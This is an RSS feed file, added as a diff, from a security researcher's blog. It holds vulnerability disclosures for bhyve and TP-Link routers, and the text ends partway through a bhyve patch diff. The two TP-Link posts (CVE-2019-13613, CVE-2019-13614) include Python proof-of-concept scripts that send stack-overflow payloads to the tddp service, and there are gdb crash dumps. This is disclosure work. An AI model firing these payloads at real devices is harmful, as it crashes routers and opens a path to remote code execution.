@@ -1,0 +1,2049 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Fakhri Zulkifli</title>
+    <description></description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Sat, 17 Aug 2019 16:20:11 +0800</pubDate>
+    <lastBuildDate>Sat, 17 Aug 2019 16:20:11 +0800</lastBuildDate>
+    <generator>Jekyll v3.8.6</generator>
+    
+      <item>
+        <title>BSD Hypervisor - pci_fbuf NULL Pointer Dereference</title>
+        <description>&lt;p&gt;Affected code:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 0x00000000002317ec &amp;lt;+108&amp;gt;:	mov $0x206519,%edi
+ 0x00000000002317f1 &amp;lt;+113&amp;gt;:	xor %eax,%eax
+ 0x00000000002317f3 &amp;lt;+115&amp;gt;:	mov %r9d,%esi
+ 0x00000000002317f6 &amp;lt;+118&amp;gt;:	callq 0x24aa00 &amp;lt;printf@plt&amp;gt;
+ 0x00000000002317fb &amp;lt;+123&amp;gt;:	mov 0xc8(%rbx),%rax
+=&amp;gt; 0x0000000000231802 &amp;lt;+130&amp;gt;:	cmpl $0x0,(%rax)
+ 0x0000000000231805 &amp;lt;+133&amp;gt;:	movzwl 0xc(%rbx),%eax
+ 0x0000000000231809 &amp;lt;+137&amp;gt;:	je 0x231830 &amp;lt;pci_fbuf_write+176&amp;gt;
+ 0x000000000023180b &amp;lt;+139&amp;gt;:	test %ax,%ax
+ 0x000000000023180e &amp;lt;+142&amp;gt;:	je 0x23185d &amp;lt;pci_fbuf_write+221&amp;gt;
+ 0x0000000000231810 &amp;lt;+144&amp;gt;:	cmpw $0x0,0xe(%rbx)
+ 0x0000000000231815 &amp;lt;+149&amp;gt;:	je 0x23185d &amp;lt;pci_fbuf_write+221&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Proof-of-Crash:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Thread 13 &quot;vcpu 2&quot; received signal SIGSEGV, Segmentation fault.
+[Switching to LWP 100571 of process 4094]
+0x0000000000231802 in pci_fbuf_write (ctx=&amp;lt;optimized out&amp;gt;, vcpu=&amp;lt;optimized out&amp;gt;, pi=&amp;lt;optimized out&amp;gt;, baridx=&amp;lt;optimized out&amp;gt;, offset=&amp;lt;optimized out&amp;gt;, size=&amp;lt;optimized out&amp;gt;,
+ value=1953719668) at /usr/src/usr.sbin/bhyve/pci_fbuf.c:166
+166	if (!sc-&amp;gt;gc_image-&amp;gt;vgamode &amp;amp;&amp;amp; sc-&amp;gt;memregs.width == 0 &amp;amp;&amp;amp;
+(gdb) p sc-&amp;gt;gc_image
+$1 = (struct bhyvegc_image *) 0x0
+(gdb) bt
+#0 0x0000000000231802 in pci_fbuf_write (ctx=&amp;lt;optimized out&amp;gt;, vcpu=&amp;lt;optimized out&amp;gt;, pi=&amp;lt;optimized out&amp;gt;, baridx=&amp;lt;optimized out&amp;gt;, offset=&amp;lt;optimized out&amp;gt;, size=&amp;lt;optimized out&amp;gt;,
+ value=1953719668) at /usr/src/usr.sbin/bhyve/pci_fbuf.c:166
+#1 0x0000000000230522 in pci_emul_mem_handler (ctx=0x80028e080, vcpu=2, dir=&amp;lt;optimized out&amp;gt;, addr=&amp;lt;optimized out&amp;gt;, size=4, val=0x7fffde9f2d40, arg1=0x800a9aa00, arg2=0)
+ at /usr/src/usr.sbin/bhyve/pci_emul.c:415
+#2 0x0000000000224ae4 in mem_write (ctx=0x80028e080, vcpu=2, gpa=3, wval=1953719668, size=0, arg=0x0) at /usr/src/usr.sbin/bhyve/mem.c:162
+#3 0x00000000002486ae in emulate_mov (vm=&amp;lt;optimized out&amp;gt;, vcpuid=&amp;lt;optimized out&amp;gt;, gpa=&amp;lt;optimized out&amp;gt;, vie=&amp;lt;optimized out&amp;gt;, memread=&amp;lt;optimized out&amp;gt;,
+ memwrite=&amp;lt;optimized out&amp;gt;, arg=&amp;lt;optimized out&amp;gt;) at /usr/src/sys/amd64/vmm/vmm_instruction_emul.c:517
+#4 vmm_emulate_instruction (vm=&amp;lt;optimized out&amp;gt;, vcpuid=&amp;lt;optimized out&amp;gt;, gpa=&amp;lt;optimized out&amp;gt;, vie=&amp;lt;optimized out&amp;gt;, paging=&amp;lt;optimized out&amp;gt;, memread=&amp;lt;optimized out&amp;gt;,
+ memwrite=0x224ab0 &amp;lt;mem_write&amp;gt;, memarg=0x800aad100) at /usr/src/sys/amd64/vmm/vmm_instruction_emul.c:1510
+#5 0x000000000022448f in emulate_mem_cb (ctx=0x80028e080, vcpu=2, paddr=34370857472, mr=0x0, arg=&amp;lt;optimized out&amp;gt;) at /usr/src/usr.sbin/bhyve/mem.c:238
+#6 0x00000000002243da in access_memory (ctx=0x80028e080, vcpu=2, paddr=3221241856, cb=0x224470 &amp;lt;emulate_mem_cb&amp;gt;, arg=0x7fffde9f2ec8) at /usr/src/usr.sbin/bhyve/mem.c:215
+#7 0x00000000002242b9 in emulate_mem (ctx=0x80028e080, vcpu=2, paddr=34370857472, vie=&amp;lt;optimized out&amp;gt;, paging=&amp;lt;optimized out&amp;gt;) at /usr/src/usr.sbin/bhyve/mem.c:251
+#8 0x000000000021bc75 in vmexit_inst_emul (ctx=0x80028e080, vmexit=0x24f780 &amp;lt;vmexit+272&amp;gt;, pvcpu=&amp;lt;optimized out&amp;gt;) at /usr/src/usr.sbin/bhyve/bhyverun.c:630
+#9 0x000000000021b6da in vm_loop (ctx=0x80028e080, vcpu=2, startrip=&amp;lt;optimized out&amp;gt;) at /usr/src/usr.sbin/bhyve/bhyverun.c:748
+#10 0x000000000021a969 in fbsdrun_start_thread (param=0x24e050 &amp;lt;mt_vmm_info+48&amp;gt;) at /usr/src/usr.sbin/bhyve/bhyverun.c:353
+#11 0x000000080061b776 in ?? () from /lib/libthr.so.3
+#12 0x0000000000000000 in ?? ()
+Backtrace stopped: Cannot access memory at address 0x7fffde9f3000
+
+(gdb) i registers
+rax 0x0 0
+rbx 0x800aec000 34371190784
+rcx 0x3 3
+rdx 0x800a9aa00 34370857472
+rsi 0x2 2
+rdi 0x80028e080 34362417280
+rbp 0x7fffde9f2cd0 0x7fffde9f2cd0
+rsp 0x7fffde9f2cc0 0x7fffde9f2cc0
+r8 0x0 0
+r9 0x4 4
+r10 0x231780 2299776
+r11 0x7fffde9f2d40 140736928361792
+r12 0x0 0
+r13 0x80028e080 34362417280
+r14 0x800a9aa00 34370857472
+r15 0x24b430 2405424
+rip 0x231802 0x231802 &amp;lt;pci_fbuf_write+130&amp;gt;
+eflags 0x10297 [ CF PF AF SF IF RF ]
+cs 0x43 67
+ss 0x3b 59
+ds &amp;lt;unavailable&amp;gt;
+es &amp;lt;unavailable&amp;gt;
+fs &amp;lt;unavailable&amp;gt;
+gs &amp;lt;unavailable&amp;gt;
+fs_base 0x800ac98d0 34371049680
+gs_base 0x0 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sat, 17 Aug 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/bhyve_fbuf_null_deref/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/bhyve_fbuf_null_deref/</guid>
+        
+        <category>bsd</category>
+        
+        <category>null pointer deref</category>
+        
+        <category>hypervisor</category>
+        
+        <category>proof-of-concept</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>[CVE-2019-13614] tddp CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow</title>
+        <description>&lt;p&gt;CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;
+
+&lt;p&gt;Proof-of-Concept:&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Copyright 2019 Google LLC.
+# SPDX-License-Identifier: Apache-2.0
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target_ip&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBBCCCCDDDD&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1040&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a2&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0.16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Send a request
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#0  0xff725778 in feof () from /lib/libc.so.0
+#1  0x0000d56c in ?? ()
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Mon, 15 Jul 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/CVE-2019-13614/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-13614/</guid>
+        
+        <category>tp-link</category>
+        
+        <category>buffer overflow</category>
+        
+        <category>stack overflow</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>[CVE-2019-13613] tddp CMD_FTEST_CONFIG Stack-based Buffer Overflow</title>
+        <description>&lt;p&gt;CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Archer Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;
+
+&lt;p&gt;Proof-of-Concept:&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Copyright 2019 Google LLC.
+# SPDX-License-Identifier: Apache-2.0
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target_ip&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;259&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBBCCCC&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1040&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;31&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0.16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s;junk&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#0  0xff7277a8 in strnlen () from /lib/libc.so.0
+#1  0xff722050 in _vfprintf_internal () from /lib/libc.so.0
+#2  0xff71f3c8 in vsnprintf () from /lib/libc.so.0
+#3  0x000092cc in ?? ()
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;https://mjg59.dreamwidth.org/51672.html?thread=1916120&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Mon, 15 Jul 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/CVE-2019-13613/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-13613/</guid>
+        
+        <category>tp-link</category>
+        
+        <category>buffer overflow</category>
+        
+        <category>stack overflow</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>BSD Hypervisor - Theoretical Stack-based Buffer Overflow</title>
+        <description>&lt;p&gt;On Jun 24, a new PCI HDAudio device model from the Google Summer of Code 2016 project was added into the BSD Hypervisor (bhyve) as part of its sound card emulation. I took a chance to look at the source code and found a trivial stack-based buffer overflow but unfortunately it is not exploitable in practice due to the limitation of bhyve’s arguments length. However, the code is patched just in case it is still going to be an issue in the future.&lt;/p&gt;
+
+&lt;p&gt;Patch diff:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;Index: head/usr.sbin/bhyve/pci_hda.c
+===================================================================
+&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- head/usr.sbin/bhyve/pci_hda.c	(revision 349384)
+&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ head/usr.sbin/bhyve/pci_hda.c	(revision 349385)
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -1,1332 +1,1331 @@&lt;/span&gt;
+ /*-
+  * SPDX-License-Identifier: BSD-2-Clause-FreeBSD
+  *
+  * Copyright (c) 2016 Alex Teaca &amp;lt;iateaca@FreeBSD.org&amp;gt;
+  * All rights reserved.
+  *
+  * Redistribution and use in source and binary forms, with or without
+  * modification, are permitted provided that the following conditions
+  * are met:
+  * 1. Redistributions of source code must retain the above copyright
+  *    notice, this list of conditions and the following disclaimer.
+  * 2. Redistributions in binary form must reproduce the above copyright
+  *    notice, this list of conditions and the following disclaimer in the
+  *    documentation and/or other materials provided with the distribution.
+  *
+  * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND
+  * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+  * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+  * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+  * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+  * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+  * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+  * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+  * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+  * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+  * SUCH DAMAGE.
+  *
+  */
+ 
+ #include &amp;lt;sys/cdefs.h&amp;gt;
+ __FBSDID(&quot;$FreeBSD$&quot;);
+ 
+ #include &amp;lt;time.h&amp;gt;
+ 
+ #include &quot;pci_hda.h&quot;
+ #include &quot;bhyverun.h&quot;
+ #include &quot;pci_emul.h&quot;
+ #include &quot;hdac_reg.h&quot;
+ 
+ /*
+  * HDA defines
+  */
+ #define PCIR_HDCTL		0x40
+ #define INTEL_VENDORID		0x8086
+ #define HDA_INTEL_82801G	0x27d8
+ 
+ #define HDA_IOSS_NO		0x08
+ #define HDA_OSS_NO		0x04
+ #define HDA_ISS_NO		0x04
+ #define HDA_CODEC_MAX		0x0f
+ #define HDA_LAST_OFFSET						\
+ 	(0x2084 + ((HDA_ISS_NO) * 0x20) + ((HDA_OSS_NO) * 0x20))
+ #define HDA_SET_REG_TABLE_SZ					\
+ 	(0x80 + ((HDA_ISS_NO) * 0x20) + ((HDA_OSS_NO) * 0x20))
+ #define HDA_CORB_ENTRY_LEN	0x04
+ #define HDA_RIRB_ENTRY_LEN	0x08
+ #define HDA_BDL_ENTRY_LEN	0x10
